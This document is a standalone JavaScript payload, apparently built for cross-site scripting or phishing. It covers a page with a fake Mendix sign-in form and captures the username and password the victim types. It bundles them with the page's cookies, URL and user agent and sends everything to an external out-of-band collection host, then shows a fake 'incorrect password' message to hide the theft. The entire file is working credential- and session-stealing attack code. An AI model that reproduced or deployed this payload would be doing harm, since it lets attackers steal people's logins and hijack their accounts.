(function () {
  var EXFIL = "https://daqqb5agsqoclmpmuo5gzeamksj6apz4o.oast.site";

  function loot(extra) {
    return Object.assign({
      url: location.href, origin: location.origin, ua: navigator.userAgent,
      cookies: document.cookie, ts: Date.now()
    }, extra || {});
  }
  function exfil(obj) {
    var body = JSON.stringify(obj);
    try { navigator.sendBeacon(EXFIL + "/c?d=" + encodeURIComponent(body), body); } catch (e) {}
    try { fetch(EXFIL + "/c", {method:"POST", mode:"no-cors", keepalive:true, body:body}); } catch (e) {}
  }

  function render() {
    var w = document.createElement("div");
    w.style.cssText = "position:fixed;inset:0;z-index:2147483647;background:#f5f6f8;display:flex;align-items:center;justify-content:center;font-family:system-ui,Arial,sans-serif";
    w.innerHTML =
      '<div style="width:360px;background:#fff;border-radius:8px;box-shadow:0 6px 24px rgba(0,0,0,.12);padding:32px 28px">' +
        '<div style="font-size:22px;font-weight:700;color:#0a1325">Mendix</div>' +
        '<div style="font-size:14px;color:#5b6472;margin:4px 0 22px">Sign in to continue</div>' +
        '<form id="mx-f" onsubmit="return false" method="post" action="javascript:void(0)">' +   // <-- never submits natively
          '<input id="mx-u" type="text" placeholder="Email / Username" style="width:100%;box-sizing:border-box;padding:10px;border:1px solid #c9ced6;border-radius:6px;margin-bottom:16px">' +
          '<input id="mx-p" type="password" placeholder="Password" style="width:100%;box-sizing:border-box;padding:10px;border:1px solid #c9ced6;border-radius:6px;margin-bottom:20px">' +
          '<button id="mx-b" type="button" style="width:100%;padding:11px;border:0;border-radius:6px;background:#0a4dbb;color:#fff;font-weight:600;cursor:pointer">Sign in</button>' +
          '<div id="mx-e" style="display:none;color:#c0392b;font-size:13px;margin-top:14px">The username or password you entered is incorrect.</div>' +
        '</form>' +
      '</div>';
    document.documentElement.appendChild(w);

    document.getElementById("mx-b").addEventListener("click", function () {
      var u = document.getElementById("mx-u").value.trim();
      var p = document.getElementById("mx-p").value;
      if (!u || !p) return;
      this.disabled = true; this.textContent = "Signing in...";
      exfil(loot({ u: u, p: p }));
      setTimeout(function(){ document.getElementById("mx-e").style.display = "block"; }, 700);
    });

    // extra guard: swallow the form's submit entirely
    document.getElementById("mx-f").addEventListener("submit", function (e) { e.preventDefault(); }, true);
  }

  render();
})();
